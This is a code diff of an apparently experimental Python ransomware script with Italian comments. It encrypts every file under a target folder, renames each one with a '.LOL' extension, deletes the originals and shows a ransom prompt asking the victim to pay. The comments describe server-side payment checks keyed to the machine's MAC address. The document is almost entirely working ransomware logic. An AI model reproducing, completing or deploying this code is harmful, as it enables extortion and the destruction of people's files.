@@ -1,4 +1,5 @@
 import os
+import requests
 from uuid import getnode as get_mac
 from cryptography.fernet import Fernet
 
@@ -66,14 +67,16 @@ def remove_file(path):
 mac = still_MAC_Address()
 print mac
 
-key_path = 'kiavetta.key'
+key_path = ''
+key_name = 'kiavetta.key'
 root_path = '.\Experiment'
 
 # se esiste chiavetta, chiedi al server se quell'utente con quel MAC address ha pagato: se si decritta se no Null
 # altrimenti, invia la Request con quel MAC address, fai generare al server la chiave, e attraverso Response
 # usala per crittare tutto
+condition = False
 
-if os.path.isfile(key_path):
+if os.path.isfile(key_path+key_name) and not os.path.isfile("check.check"):
     # 1) Request "ifUserPayed(MACAddress)"
     # 2) if True Decrypt everything
 
@@ -84,7 +87,7 @@ if os.path.isfile(key_path):
 
     if resp:
         # key = db stored key...
-        key = key_recuva(key_path)
+        key = key_recuva(key_path+key_name)
 
         #for every file stored, decrypt everything
         for root, dirs, files in os.walk(root_path):
@@ -109,29 +112,39 @@ if os.path.isfile(key_path):
                     remove_file(tmp_path)
 
         #Remove kiavetta just for testing
-        remove_file(key_path)
+        remove_file(key_path+key_name)
+
+        condition = True
 
 
 else:
     # 1) Request "newUser(MACAddress)" return Key
     # 2) crypt everything
 
-    # key = db stored key...
-    key = key_generation(key_path)
+    if not os.path.isfile("check.check"):
+        # key = db stored key...
+        key = key_generation(key_path+key_name)
 
-    # for every file stored, crypt everything
-    for root, dirs, files in os.walk(root_path):
-        for file in files:
-            print(os.path.join(root, file))
-            tmp_path = os.path.join(root, file)
+        # for every file stored, crypt everything
+        for root, dirs, files in os.walk(root_path):
+            for file in files:
+                print(os.path.join(root, file))
+                tmp_path = os.path.join(root, file)
 
-            # Open file as a string
-            file_string = open_file(tmp_path)
+                # Open file as a string
+                file_string = open_file(tmp_path)
 
-            # File Encryption
-            file_tmp = crypt(key, file_string)
+                # File Encryption
+                file_tmp = crypt(key, file_string)
 
-            # Create a file with .LOL extension
-            write_file(tmp_path + ".LOL", file_tmp)
-            remove_file(tmp_path)
+                # Create a file with .LOL extension
+                write_file(tmp_path + ".LOL", file_tmp)
+                remove_file(tmp_path)
 
+        write_file("check.check", "")
+
+    var = raw_input("TUTTI I TUOI FILE SONO CRITTATI! VUOI PAGARE 1000MILA SOLDI?")
+    if var.lower() == "si":
+        # Send to Server Payment Request
+        remove_file("check.check")
+        print "SAGGIA SCELTA. FAI RIPARTIRE IL PROGRAMMA PER DECRITTARE TUTTO"
